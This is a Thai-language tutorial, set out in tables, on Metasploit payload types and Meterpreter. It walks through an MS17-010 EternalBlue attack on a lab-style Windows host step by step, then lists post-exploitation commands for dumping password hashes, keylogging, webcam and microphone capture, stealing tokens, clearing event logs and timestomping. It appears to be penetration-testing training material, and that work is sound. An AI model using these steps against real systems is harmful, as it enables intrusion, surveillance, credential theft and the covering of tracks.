
---

# Payloads ใน Metasploit (ฉบับตารางครบถ้วน)



---

## Payload คืออะไร?

| หัวข้อ | รายละเอียด |
|--------|------------|
| **คำนิยาม** | Module ที่ช่วยให้ exploit สามารถส่ง shell กลับมายังผู้โจมตี |
| **การทำงาน** | ส่งไปพร้อมกับ exploit เพื่อ bypass การทำงานปกติของบริการที่มีช่องโหว่ |
| **วัตถุประสงค์** | สร้างการเชื่อมต่อกลับมายังเครื่องผู้โจมตีและสร้าง foothold |
| **ส่วนประกอบ** | Exploit (ใช้ช่องโหว่) + Payload (รับ shell) |

---

## ประเภทของ Payload

### ตารางเปรียบเทียบ 3 ประเภทหลัก

| ประเภท | คำอธิบาย | ขนาด | เสถียรภาพ | ตัวอย่าง |
|--------|----------|------|-----------|----------|
| **Singles** | Payload แบบครบในตัวเดียว มี exploit และ shellcode อยู่ด้วยกัน | ใหญ่ | สูงมาก | `windows/shell_bind_tcp` |
| **Stagers** | Payload ขนาดเล็กที่รอสร้างการเชื่อมต่อกับ Stage | เล็ก | ปานกลาง | `reverse_tcp`, `bind_tcp` |
| **Stages** | Payload ขนาดใหญ่ที่ดาวน์โหลดโดย Stager | ใหญ่มาก | สูง | `meterpreter`, `shell`, `vncinject` |

---

## Staged vs Non-Staged

### ตารางการแยกประเภท

| ลักษณะ | Single Payload (Non-Staged) | Staged Payload |
|--------|----------------------------|----------------|
| **รูปแบบชื่อ** | ไม่มี `/` คั่น | มี `/` คั่น |
| **ตัวอย่าง** | `windows/shell_bind_tcp` | `windows/shell/bind_tcp` |
| **โครงสร้าง** | Exploit + Shellcode ในที่เดียว | Stager + Stage แยกกัน |
| **ขนาด** | ใหญ่ (3-10 KB+) | Stager เล็ก (300-800 bytes), Stage ใหญ่ |
| **การส่งข้อมูล** | ส่งครั้งเดียว | ส่ง 2 ครั้ง (Stager แล้วค่อย Stage) |
| **ความเสถียร** | เสถียรมาก | ปานกลาง-สูง |
| **ความยืดหยุ่น** | จำกัด | สูงมาก |
| **เหมาะกับ** | Exploit ที่รองรับขนาดใหญ่ | Exploit ที่จำกัดขนาด |

---

## 1. Singles (Single Payloads) - รายละเอียด

### คุณสมบัติ

| คุณสมบัติ | รายละเอียด |
|-----------|------------|
| **Self-contained** | มีทุกอย่างอยู่ในตัว ไม่ต้องพึ่งพา component อื่น |
| **เสถียรภาพ** | เสถียรที่สุดเพราะไม่มีขั้นตอนการดาวน์โหลดเพิ่ม |
| **ขนาด** | ใหญ่ (อาจเกิน 10 KB) |
| **การรองรับ** | บาง exploit ไม่รองรับเพราะขนาดใหญ่เกินไป |

### ข้อดี vs ข้อเสีย

| ข้อดี ✅ | ข้อเสีย ❌ |
|---------|-----------|
| ส่งครั้งเดียวเสร็จ | ขนาดใหญ่ |
| เสถียรมาก | บาง exploit ใช้ไม่ได้ |
| ไม่ต้องรอ stage | ฟีเจอร์จำกัด |
| ไม่มีปัญหาการดาวน์โหลด stage | ตรวจจับได้ง่ายกว่า (ขนาดใหญ่) |

### ตัวอย่างการใช้งาน

| งาน | Payload ที่เหมาะสม |
|-----|-------------------|
| เพิ่ม user ในระบบ | `windows/adduser` |
| เปิด process | `windows/exec` |
| Bind shell ธรรมดา | `windows/shell_bind_tcp` |
| Reverse shell ธรรมดา | `windows/shell_reverse_tcp` |

---

## 2. Stagers - รายละเอียด

### คุณสมบัติ

| คุณสมบัติ | รายละเอียด |
|-----------|------------|
| **ขนาด** | เล็กมาก (300-800 bytes) |
| **หน้าที่** | สร้างการเชื่อมต่อระหว่างผู้โจมตีและเหยื่อ |
| **ความน่าเชื่อถือ** | ออกแบบให้น่าเชื่อถือและทำงานได้ในสภาพแวดล้อมส่วนใหญ่ |
| **ตำแหน่ง** | รออยู่บนเครื่องผู้โจมตี |

### Windows NX vs NO-NX Stagers

| ประเภท | ขนาด | ความเข้ากันได้ | หมายเหตุ |
|--------|------|----------------|----------|
| **NO-NX Stagers** | เล็กกว่า | Windows XP และเก่ากว่า | ไม่รองรับ DEP/NX |
| **NX Stagers** | ใหญ่กว่า | Windows Vista/7/8/10+ | ใช้ VirtualAlloc memory |
| **Default (ปัจจุบัน)** | กลาง | NX + Win7 compatible | เหมาะกับระบบส่วนใหญ่ |

### ชนิดของ Stagers ที่พบบ่อย

| Stager | Protocol | ทิศทาง | Port | ข้อดี | ข้อเสีย |
|--------|----------|--------|------|-------|---------|
| **reverse_tcp** | TCP | Target → Attacker | กำหนดเอง (4444) | หลบ Firewall ง่าย | ไม่เข้ารหัส |
| **reverse_https** | HTTPS | Target → Attacker | 443 | เข้ารหัส, ดูเหมือน traffic ปกติ | ช้ากว่า TCP |
| **reverse_http** | HTTP | Target → Attacker | 80 | ดูเหมือน traffic ปกติ | ไม่เข้ารหัส |
| **bind_tcp** | TCP | Attacker → Target | กำหนดเอง | เชื่อมต่อตรง | Firewall บล็อคได้ง่าย |
| **bind_ipv6_tcp** | TCP (IPv6) | Attacker → Target | กำหนดเอง | หลบเลี่ยง IPv4 filtering | ต้องรองรับ IPv6 |
| **reverse_tcp_rc4** | TCP (RC4) | Target → Attacker | กำหนดเอง | เข้ารหัส RC4 | ช้ากว่าแบบธรรมดา |

---

## 3. Stages - รายละเอียด

### คุณสมบัติ

| คุณสมบัติ | รายละเอียด |
|-----------|------------|
| **การดาวน์โหลด** | ดาวน์โหลดโดย Stager หลังสร้างการเชื่อมต่อแล้ว |
| **ขนาด** | ไม่จำกัด (สามารถใหญ่มากได้) |
| **ฟีเจอร์** | ขั้นสูงมาก (Meterpreter, VNC, etc.) |
| **Middle Stagers** | ใช้ middle stager สำหรับ payload ขนาดใหญ่มาก |

### กระบวนการทำงานของ Stages

| ขั้นตอน | กระบวนการ | ขนาดข้อมูล |
|---------|------------|------------|
| **1. Initial Exploit** | ส่ง Stager ไปยังเป้าหมาย | 300-800 bytes |
| **2. Stager Execution** | Stager ทำงานและสร้างการเชื่อมต่อกลับ | - |
| **3. Stage Request** | Stager ขอ Stage จากผู้โจมตี | - |
| **4. Stage Download** | ดาวน์โหลด Stage (อาจใช้ middle stager) | 50-500+ KB |
| **5. Stage Execution** | รัน Stage และได้ shell | - |

### Middle Stagers

| สถานการณ์ | วิธีแก้ปัญหา |
|----------|--------------|
| **Single recv() ล้มเหลว** | Payload ใหญ่เกินรับครั้งเดียวไม่ได้ |
| **ใช้ Middle Stager** | แบ่งการรับข้อมูลเป็นหลายครั้ง |
| **Full Download** | Middle stager ดาวน์โหลด stage เต็มรูปแบบ |
| **RWX Benefits** | ดีกว่าสำหรับ memory ที่เป็น Read-Write-Execute |

### ตัวอย่าง Stages ที่มีชื่อเสียง

| Stage | ประเภท | คุณสมบัติเด่น | ขนาด |
|-------|--------|---------------|------|
| **Meterpreter** | Interactive Shell | DLL injection, Fileless, Powerful | 200+ KB |
| **Shell** | Command Shell | Shell ธรรมดา (CMD/Bash) | 5-20 KB |
| **VNC Inject** | Remote Desktop | ควบคุมหน้าจอแบบ GUI | 100+ KB |
| **PowerShell** | PowerShell Shell | ใช้ PowerShell native | 50+ KB |

---

## Staged Payloads - การทำงานแบบละเอียด

### Stage0 (Initial Shellcode)

| หัวข้อ | รายละเอียด |
|--------|------------|
| **ชื่อเรียก** | Stager / Stage0 |
| **ขนาด** | 300-800 bytes (เล็กมาก) |
| **วัตถุประสงค์หลัก** | สร้าง reverse connection กลับมายังผู้โจมตี |
| **การส่ง** | ส่งผ่านเครือข่ายไปยังบริการที่มีช่องโหว่ |
| **หน้าที่** | 1. สร้างการเชื่อมต่อ<br>2. รอรับ Stage1<br>3. อ่าน Stage1 เข้า memory |

### Stage1 (Full Payload)

| หัวข้อ | รายละเอียด |
|--------|------------|
| **ชื่อเรียก** | Stage / Stage1 / Full Payload |
| **ขนาด** | 50 KB - 500 KB+ (ใหญ่มาก) |
| **การส่ง** | ส่งหลังสร้างช่องทางสื่อสารเสถียรแล้ว |
| **วัตถุประสงค์** | ให้ shell access แบบเต็มรูปแบบ |
| **ตัวอย่าง** | Meterpreter, VNC, PowerShell |

### เหตุผลที่ใช้ Reverse Connection

| ข้อดี ✅ | เหตุผล |
|---------|--------|
| **หลบการตรวจจับ** | ดูเหมือนการเชื่อมต่อปกติจากภายในออกไปภายนอก |
| **Bypass Firewall** | Firewall มักอนุญาต outbound connection |
| **Security Trust Zone** | เครื่องเหยื่ออยู่ในโซนที่เชื่อถือได้ |
| **NAT Friendly** | ไม่มีปัญหากับ NAT/Router |

| ข้อควรระวัง ⚠️ | รายละเอียด |
|---------------|------------|
| **ไม่ได้ปลอดภัย 100%** | ระบบ security ยังตรวจจับได้ |
| **IDS/IPS** | อาจตรวจจับ pattern ของ reverse connection |
| **Egress Filtering** | บาง network กรอง outbound traffic |

---

## Meterpreter Payload (ฉบับสมบูรณ์)

### ภาพรวม

| หัวข้อ | รายละเอียด |
|--------|------------|
| **ประเภท** | Multi-faceted staged payload |
| **เทคนิค** | DLL Injection |
| **ที่เก็บข้อมูล** | Memory เท่านั้น (RAM) |
| **ร่องรอยบน HDD** | ไม่มี (Fileless) |
| **การตรวจจับ** | ยากมากด้วย forensic ธรรมดา |
| **ความยืดหยุ่น** | โหลด scripts/plugins แบบ dynamic |

### คุณสมบัติพิเศษ 5 ประการ

| คุณสมบัติ | คำอธิบาย | ประโยชน์ |
|-----------|----------|----------|
| **1. DLL Injection** | ฉีด DLL เข้าไปใน process ที่มีอยู่แล้ว | การเชื่อมต่อเสถียร, ยากต่อการตรวจจับ |
| **2. Fileless** | อยู่ใน RAM ทั้งหมด ไม่เขียนไฟล์ลง HDD | ไม่ทิ้งร่องรอย, หลบ antivirus |
| **3. Persistent** | คงอยู่ได้แม้รีบูตหรือมีการเปลี่ยนแปลง | ไม่ต้องติดตั้งใหม่ |
| **4. Dynamic Loading** | โหลด/ถอด scripts และ plugins ได้ทันที | ไม่ต้อง restart session |
| **5. Encrypted Communication** | สื่อสารแบบเข้ารหัส | ป้องกันการดักฟังข้อมูล |

---

## การค้นหา Payloads

### คำสั่งพื้นฐาน

| คำสั่ง | ผลลัพธ์ | จำนวน |
|--------|---------|-------|
| `show payloads` | แสดง payload ทั้งหมด | 560+ payloads |
| `grep meterpreter show payloads` | กรองเฉพาะ Meterpreter | ~50 payloads |
| `grep -c meterpreter show payloads` | นับจำนวน Meterpreter | จำนวนเป็นตัวเลข |

### เทคนิคการค้นหาแบบ Advanced

| เทคนิค | ตัวอย่างคำสั่ง | ผลลัพธ์ |
|--------|---------------|---------|
| **Single grep** | `grep meterpreter show payloads` | Meterpreter ทั้งหมด (14 รายการ) |
| **Double grep** | `grep meterpreter grep reverse_tcp show payloads` | Meterpreter reverse TCP (3 รายการ) |
| **Triple grep** | `grep meterpreter grep reverse grep x64 show payloads` | Meterpreter reverse x64 |
| **Count results** | `grep -c <keyword> show payloads` | แสดงจำนวนเป็นตัวเลข |

### ตัวอย่างผลลัพธ์การค้นหา

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

| # | Payload | Rank | Check | Description |
|---|---------|------|-------|-------------|
| 15 | `windows/x64/meterpreter/reverse_tcp` | normal | No | Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager |
| 16 | `windows/x64/meterpreter/reverse_tcp_rc4` | normal | No | Windows Meterpreter, Reverse TCP Stager (RC4 Stage Encryption) |
| 17 | `windows/x64/meterpreter/reverse_tcp_uuid` | normal | No | Windows Meterpreter, Reverse TCP Stager with UUID Support |

---

## การเลือกและตั้งค่า Payload

### ขั้นตอนการเลือก Payload (ครบถ้วน)

| ขั้นตอน | คำสั่ง | หมายเหตุ |
|---------|--------|----------|
| **1. เลือก Exploit** | `use exploit/windows/smb/ms17_010_eternalblue` | ต้องเลือก exploit ก่อน |
| **2. ดู Payloads** | `show payloads` | ดู payload ที่รองรับ |
| **3. กรอง Payloads** | `grep meterpreter grep reverse_tcp show payloads` | ค้นหาแบบเจาะจง |
| **4. เลือก Payload** | `set payload 15` | ใช้ index number |
| **5. ตรวจสอบ Options** | `show options` | ดูตัวเลือกที่ต้องตั้ง |
| **6. ตั้งค่า LHOST** | `set LHOST 10.10.14.15` | IP ของเครื่องเรา |
| **7. ตั้งค่า RHOSTS** | `set RHOSTS 10.10.10.40` | IP ของเป้าหมาย |
| **8. รัน Exploit** | `run` หรือ `exploit` | เริ่มโจมตี |

### ตารางตัวแปรที่ต้องตั้งค่า

#### สำหรับ Exploit Module

| Parameter | Required | คำอธิบาย | ตัวอย่าง | หมายเหตุ |
|-----------|----------|----------|----------|----------|
| **RHOSTS** | ✅ Yes | IP address ของเป้าหมาย | `10.10.10.40` | สามารถระบุหลาย IP หรือ CIDR |
| **RPORT** | ✅ Yes | Port ของบริการเป้าหมาย | `445` | มักตั้งค่าไว้แล้ว |
| **SMBDomain** | ❌ No | Windows domain (ถ้ามี) | `.` | สำหรับ domain environment |
| **SMBUser** | ❌ No | Username สำหรับ authentication | `administrator` | ถ้าต้องการ auth |
| **SMBPass** | ❌ No | Password สำหรับ authentication | `P@ssw0rd` | ถ้าต้องการ auth |

#### สำหรับ Payload Module

| Parameter | Required | คำอธิบาย | ตัวอย่าง | หมายเหตุ |
|-----------|----------|----------|----------|----------|
| **LHOST** | ✅ Yes | IP address ของเครื่องเรา | `10.10.14.15` | สำหรับ reverse connection |
| **LPORT** | ✅ Yes | Port ที่รอรับการเชื่อมต่อ | `4444` | ตรวจสอบว่าไม่ถูกใช้งาน |
| **EXITFUNC** | ✅ Yes | วิธีการออกจาก payload | `thread` | `thread`, `process`, `none` |

### การตรวจสอบ IP ของเครื่องเรา

| วิธี | คำสั่ง | ตัวอย่างผลลัพธ์ |
|-----|--------|------------------|
| **ใน msfconsole** | `ifconfig` | `inet 10.10.14.15 netmask 255.255.254.0` |
| **Linux terminal** | `ip addr` หรือ `ifconfig` | แสดง interface ทั้งหมด |
| **ใน msfconsole** | `route` | แสดง routing table |

---

## ตัวอย่างการใช้งานจริง (Step-by-Step)

### Scenario: โจมตี Windows 7 ด้วย MS17-010 และ Meterpreter

#### ขั้นตอนที่ 1: Scan เป้าหมาย

```bash
nmap -sV 10.10.10.40
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| **445/tcp** | **open** | **microsoft-ds** | **Microsoft Windows 7 - 10** |

#### ขั้นตอนที่ 2-8: ใน Metasploit

| ขั้นตอน | คำสั่ง | ผลลัพธ์ |
|---------|--------|---------|
| **2. เริ่ม msfconsole** | `msfconsole` | แสดง banner |
| **3. ค้นหา exploit** | `search ms17_010` | แสดง exploit ที่เกี่ยวข้อง |
| **4. เลือก exploit** | `use 0` หรือ `use exploit/windows/smb/ms17_010_eternalblue` | `msf6 exploit(windows/smb/ms17_010_eternalblue) >` |
| **5. ค้นหา payload** | `grep meterpreter grep reverse_tcp show payloads` | แสดง 3 payloads |
| **6. เลือก payload** | `set payload 15` | `payload => windows/x64/meterpreter/reverse_tcp` |
| **7. ตรวจสอบ IP** | `ifconfig` | `inet 10.10.14.15` |
| **8. ตั้งค่า LHOST** | `set LHOST 10.10.14.15` | `LHOST => 10.10.14.15` |
| **9. ตั้งค่า RHOSTS** | `set RHOSTS 10.10.10.40` | `RHOSTS => 10.10.10.40` |
| **10. ดู options** | `show options` | แสดงการตั้งค่าทั้งหมด |
| **11. รัน exploit** | `run` หรือ `exploit` | เริ่มโจมตี |

#### ผลลัพธ์เมื่อสำเร็จ

| ขั้นตอน | Log Message | ความหมาย |
|---------|-------------|----------|
| **1** | `[*] Started reverse TCP handler on 10.10.14.15:4444` | เริ่มรอรับการเชื่อมต่อ |
| **2** | `[+] Host is likely VULNERABLE to MS17-010!` | เป้าหมายมีช่องโหว่ |
| **3** | `[+] Connection established for exploitation.` | สร้างการเชื่อมต่อสำเร็จ |
| **4** | `[+] ETERNALBLUE overwrite completed successfully!` | Exploit สำเร็จ |
| **5** | `[*] Sending stage (201283 bytes) to 10.10.10.40` | ส่ง Meterpreter stage |
| **6** | `[*] Meterpreter session 1 opened` | ได้ Meterpreter session |
| **7** | `meterpreter >` | พร้อมใช้งาน! |

---

## Meterpreter Commands (ทั้งหมด)

### 1. Core Commands (คำสั่งพื้นฐาน)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน |
|--------|----------|-------------------|
| `?` หรือ `help` | แสดงเมนูช่วยเหลือ | `help` |
| `background` หรือ `bg` | ส่ง session ไปพื้นหลัง | `background` |
| `bgkill` | ฆ่า background script | `bgkill <script_id>` |
| `bglist` | แสดง background scripts ที่กำลังรัน | `bglist` |
| `bgrun` | รัน meterpreter script แบบ background | `bgrun <script>` |
| `channel` | แสดงข้อมูล active channels | `channel -l` |
| `close` | ปิด channel | `close <channel_id>` |
| `exit` หรือ `quit` | ออกจาก meterpreter session | `exit` |
| `guid` | แสดง session GUID | `guid` |
| `info` | แสดงข้อมูล Post module | `info <module>` |
| `irb` | เปิด Interactive Ruby shell | `irb` |
| `load` | โหลด meterpreter extension | `load kiwi` |
| `machine_id` | แสดง MSF ID ของเครื่อง | `machine_id` |
| `migrate` | ย้าย meterpreter ไป process อื่น | `migrate 1234` |
| `pivot` | จัดการ pivot listeners | `pivot add -H 10.10.10.1` |
| `pry` | เปิด Pry debugger | `pry` |
| `read` | อ่านข้อมูลจาก channel | `read <channel_id>` |
| `resource` | รันคำสั่งจากไฟล์ | `resource script.rc` |
| `run` | รัน meterpreter script หรือ Post module | `run post/windows/gather/hashdump` |
| `sessions` | สลับไป session อื่น | `sessions 2` |
| `set_timeouts` | ตั้งค่า session timeout | `set_timeouts 600` |
| `get_timeouts` | ดูค่า session timeout ปัจจุบัน | `get_timeouts` |
| `sleep` | ทำให้ Meterpreter หยุดทำงาน แล้วกลับมาทำงาน | `sleep 60` |
| `uuid` | แสดง UUID ของ session | `uuid` |
| `write` | เขียนข้อมูลไปยัง channel | `write <channel_id> "data"` |

---

### 2. File System Commands (คำสั่งจัดการไฟล์)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | หมายเหตุ |
|--------|----------|-------------------|----------|
| `cat` | อ่านไฟล์และแสดงบนหน้าจอ | `cat passwords.txt` | เหมือน Linux `cat` |
| `cd` | เปลี่ยน directory | `cd C:\Users\Administrator` | เหมือน Windows `cd` |
| `checksum` | ดู checksum ของไฟล์ | `checksum MD5 file.exe` | รองรับ MD5, SHA1 |
| `cp` | คัดลอกไฟล์ | `cp source.txt dest.txt` | เหมือน Linux `cp` |
| `dir` หรือ `ls` | แสดงรายการไฟล์ | `ls` หรือ `dir` | เหมือน Windows/Linux |
| `download` | ดาวน์โหลดไฟล์หรือ folder | `download C:\Users\Admin\Desktop\secrets.txt` | รองรับ recursive |
| `edit` | แก้ไขไฟล์ | `edit config.ini` | เปิด text editor |
| `getlwd` หรือ `lpwd` | แสดง local working directory (เครื่องเรา) | `getlwd` | เครื่องผู้โจมตี |
| `getwd` หรือ `pwd` | แสดง working directory (เครื่องเป้าหมาย) | `pwd` | เครื่องเหยื่อ |
| `lcd` | เปลี่ยน local directory (เครื่องเรา) | `lcd /tmp` | เครื่องผู้โจมตี |
| `lls` | แสดงไฟล์ local (เครื่องเรา) | `lls` | เครื่องผู้โจมตี |
| `mkdir` | สร้าง directory | `mkdir C:\temp\backup` | สร้าง folder ใหม่ |
| `mv` | ย้ายหรือเปลี่ยนชื่อไฟล์ | `mv old.txt new.txt` | เหมือน Linux `mv` |
| `rm` | ลบไฟล์ | `rm unwanted.txt` | ระวัง! ลบถาวร |
| `rmdir` | ลบ directory | `rmdir C:\temp\old` | ต้องว่างเปล่า |
| `search` | ค้นหาไฟล์ | `search -f *.pdf` | ค้นหาแบบ recursive |
| `show_mount` | แสดง mount points/logical drives | `show_mount` | C:, D:, E:, etc. |
| `upload` | อัพโหลดไฟล์หรือ folder | `upload /tmp/tool.exe C:\Windows\Temp\` | รองรับ recursive |

---

### 3. Networking Commands (คำสั่งเครือข่าย)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | หมายเหตุ |
|--------|----------|-------------------|----------|
| `arp` | แสดง ARP cache | `arp` | ดู IP-MAC mapping |
| `getproxy` | แสดงการตั้งค่า proxy | `getproxy` | HTTP/HTTPS proxy |
| `ifconfig` หรือ `ipconfig` | แสดง network interfaces | `ifconfig` | IP, MAC, Subnet |
| `netstat` | แสดง network connections | `netstat` | Active connections |
| `portfwd` | Forward port จาก local ไป remote | `portfwd add -l 3389 -p 3389 -r 10.10.10.5` | สำหรับ pivoting |
| `portfwd list` | แสดง port forwards ที่มี | `portfwd list` | ดูการ forward ทั้งหมด |
| `portfwd delete` | ลบ port forward | `portfwd delete -l 3389` | ลบตาม local port |
| `resolve` | แปลง hostname เป็น IP | `resolve www.google.com` | DNS resolution |
| `route` | ดูและแก้ไข routing table | `route` | Network routes |
| `route add` | เพิ่ม route | `route add 192.168.1.0 255.255.255.0 1` | สำหรับ pivoting |
| `route delete` | ลบ route | `route delete 192.168.1.0 255.255.255.0 1` | ลบ route ที่เพิ่ม |

---

### 4. System Commands (คำสั่งระบบ)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | ต้องการ Privilege |
|--------|----------|-------------------|-------------------|
| `clearev` | ลบ event logs | `clearev` | ✅ Admin |
| `drop_token` | ทิ้ง impersonation token | `drop_token` | ❌ |
| `execute` | รันคำสั่งหรือโปรแกรม | `execute -f cmd.exe -i -H` | ❌ |
| `getenv` | ดูค่า environment variable | `getenv PATH` | ❌ |
| `getpid` | แสดง Process ID ปัจจุบัน | `getpid` | ❌ |
| `getprivs` | พยายามเปิด privileges ทั้งหมด | `getprivs` | ⚠️ ขึ้นกับสิทธิ์ |
| `getsid` | แสดง SID ของ user | `getsid` | ❌ |
| `getuid` | แสดง username ที่กำลังใช้ | `getuid` | ❌ |
| `kill` | ฆ่า process | `kill 1234` | ⚠️ ขึ้นกับสิทธิ์ |
| `localtime` | แสดงวันที่และเวลาของเป้าหมาย | `localtime` | ❌ |
| `pgrep` | ค้นหา process ตามชื่อ | `pgrep explorer` | ❌ |
| `pkill` | ฆ่า process ตามชื่อ | `pkill notepad` | ⚠️ ขึ้นกับสิทธิ์ |
| `ps` | แสดง process ทั้งหมด | `ps` | ❌ |
| `reboot` | รีบูตเครื่อง | `reboot` | ✅ Admin |
| `reg` | จัดการ Windows Registry | `reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion -v ProgramFilesDir` | ⚠️ ขึ้นกับสิทธิ์ |
| `rev2self` | เรียก RevertToSelf() | `rev2self` | ❌ |
| `shell` | เปิด system command shell | `shell` | ❌ |
| `shutdown` | ปิดเครื่อง | `shutdown` | ✅ Admin |
| `steal_token` | ขโมย token จาก process | `steal_token 1234` | ⚠️ ขึ้นกับสิทธิ์ |
| `suspend` | หยุด/เริ่ม process ชั่วคราว | `suspend 1234` | ⚠️ ขึ้นกับสิทธิ์ |
| `sysinfo` | แสดงข้อมูลระบบ | `sysinfo` | ❌ |

---

### 5. User Interface Commands (คำสั่ง UI)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | ต้องการ GUI |
|--------|----------|-------------------|-------------|
| `enumdesktops` | แสดง desktops และ window stations | `enumdesktops` | ✅ |
| `getdesktop` | ดู desktop ปัจจุบันของ meterpreter | `getdesktop` | ✅ |
| `idletime` | แสดงเวลาที่ user ไม่ได้ใช้งาน | `idletime` | ✅ |
| `keyboard_send` | ส่ง keystroke | `keyboard_send "Hello"` | ✅ |
| `keyevent` | ส่ง key events | `keyevent 13` | ✅ |
| `keyscan_dump` | ดัมพ์ keystroke buffer | `keyscan_dump` | ✅ |
| `keyscan_start` | เริ่ม keylogger | `keyscan_start` | ✅ |
| `keyscan_stop` | หยุด keylogger | `keyscan_stop` | ✅ |
| `mouse` | ส่ง mouse events | `mouse -c 100,100` | ✅ |
| `screenshare` | ดูหน้าจอแบบ real-time | `screenshare` | ✅ |
| `screenshot` | จับภาพหน้าจอ | `screenshot` | ✅ |
| `setdesktop` | เปลี่ยน desktop ของ meterpreter | `setdesktop <number>` | ✅ |
| `uictl` | ควบคุม UI components | `uictl disable keyboard` | ✅ |

---

### 6. Webcam Commands (คำสั่งกล้อง)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | ต้องการ Webcam |
|--------|----------|-------------------|----------------|
| `record_mic` | บันทึกเสียงจากไมโครโฟน | `record_mic -d 30` | ✅ |
| `webcam_chat` | เริ่ม video chat | `webcam_chat` | ✅ |
| `webcam_list` | แสดงรายการ webcams | `webcam_list` | ✅ |
| `webcam_snap` | ถ่ายรูปจาก webcam | `webcam_snap` | ✅ |
| `webcam_stream` | เล่น video stream จาก webcam | `webcam_stream` | ✅ |

---

### 7. Audio Output Commands (คำสั่งเสียง)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | รองรับ Format |
|--------|----------|-------------------|---------------|
| `play` | เล่นไฟล์เสียงบนเครื่องเป้าหมาย | `play /path/to/file.wav` | .wav |

---

### 8. Privilege Escalation Commands (คำสั่ง Privesc)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | Success Rate |
|--------|----------|-------------------|--------------|
| `getsystem` | พยายาม elevate เป็น SYSTEM | `getsystem` | ⚠️ ขึ้นกับระบบ |
| `getsystem -t 1` | ใช้เทคนิคที่ 1 (Named Pipe Impersonation) | `getsystem -t 1` | สูง |
| `getsystem -t 2` | ใช้เทคนิคที่ 2 (Named Pipe Impersonation - RPCSS variant) | `getsystem -t 2` | ปานกลาง |
| `getsystem -t 3` | ใช้เทคนิคที่ 3 (Token Duplication) | `getsystem -t 3` | ต่ำ |

---

### 9. Password Database Commands (คำสั่ง Credentials)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | ต้องการ Privilege |
|--------|----------|-------------------|-------------------|
| `hashdump` | ดัมพ์ SAM database (password hashes) | `hashdump` | ✅ SYSTEM/Admin |

---

### 10. Timestomp Commands (คำสั่งปลอมแปลงเวลา)

| คำสั่ง | คำอธิบาย | ตัวอย่างการใช้งาน | ต้องการ Privilege |
|--------|----------|-------------------|-------------------|
| `timestomp` | จัดการ MACE attributes ของไฟล์ | `timestomp C:\file.txt -v` | ⚠️ ขึ้นกับสิทธิ์ |
| `timestomp -m` | แก้ไข Modified time | `timestomp C:\file.txt -m "01/01/2020 12:00:00"` | ⚠️ |
| `timestomp -a` | แก้ไข Accessed time | `timestomp C:\file.txt -a "01/01/2020 12:00:00"` | ⚠️ |
| `timestomp -c` | แก้ไข Created time | `timestomp C:\file.txt -c "01/01/2020 12:00:00"` | ⚠️ |
| `timestomp -e` | แก้ไข Entry Modified time | `timestomp C:\file.txt -e "01/01/2020 12:00:00"` | ⚠️ |
| `timestomp -z` | แก้ไขทุก timestamp พร้อมกัน | `timestomp C:\file.txt -z "01/01/2020 12:00:00"` | ⚠️ |

---

### คำสั่งที่เทียบเท่ากัน

| งาน | Meterpreter | Windows CMD |
|-----|-------------|-------------|
| ดู username | `getuid` | `whoami` |
| ดูข้อมูลระบบ | `sysinfo` | `systeminfo` |
| แสดงไฟล์ | `ls` | `dir` |
| เปลี่ยน directory | `cd` | `cd` |
| ดู network config | `ifconfig` | `ipconfig` |
| ดู process | `ps` | `tasklist` |
| ฆ่า process | `kill <PID>` | `taskkill /PID <PID>` |

---
